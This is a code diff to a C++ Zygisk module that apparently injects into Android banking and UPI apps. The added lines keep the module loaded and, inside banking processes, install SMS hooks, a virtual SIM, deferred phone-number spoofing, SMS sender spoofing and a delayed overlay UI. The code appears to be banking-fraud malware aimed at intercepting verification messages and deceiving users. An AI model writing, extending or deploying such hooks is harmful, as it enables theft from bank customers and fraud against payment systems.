@@ -290,7 +290,7 @@ public:
             return;
         }
 
-        // Fragile banking — sirf SMS block hooks (crashy UPI hooks / overlay skip)
+        // Fragile banking — SMS hooks + delayed overlay (crash-safe)
         if (is_hooked_upi_ && upi_registry::is_fragile_banking_app(process_name_)) {
             touch_upi_inject(process_name_.c_str());
             touch_module_heartbeat();
@@ -300,10 +300,19 @@ public:
                 virtual_sim::install(env_, api_, process_name_);
                 outgoing_sms_hook::install(env_, api_, false, false, true);
                 outgoing_sms_hook::schedule_deferred_upi_hook(env_, api_, hook_delay > 0 ? hook_delay : 2);
-                logger::info("Hivirtus", "Fragile SMS-only hooks in %s (delay=%ds)",
+                logger::info("Virtus", "Fragile SMS hooks in %s (delay=%ds)",
                              process_name_.c_str(), hook_delay > 0 ? hook_delay : 2);
             }
-            api_->setOption(zygisk::Option::DLCLOSE_MODULE_LIBRARY);
+            if (phone_spoof_wanted) {
+                phone_number_hook::schedule_deferred_install(env_, api_, process_name_.c_str(),
+                                                             hook_delay > 0 ? hook_delay : 3);
+            }
+            if (want_sender_spoof) {
+                sender_spoof::install(env_, api_, process_name_.c_str());
+            }
+            if (native_overlay_wanted()) {
+                schedule_overlay_ui(env_, api_, process_name_, hook_delay > 0 ? hook_delay + 1 : 4);
+            }
             return;
         }
 
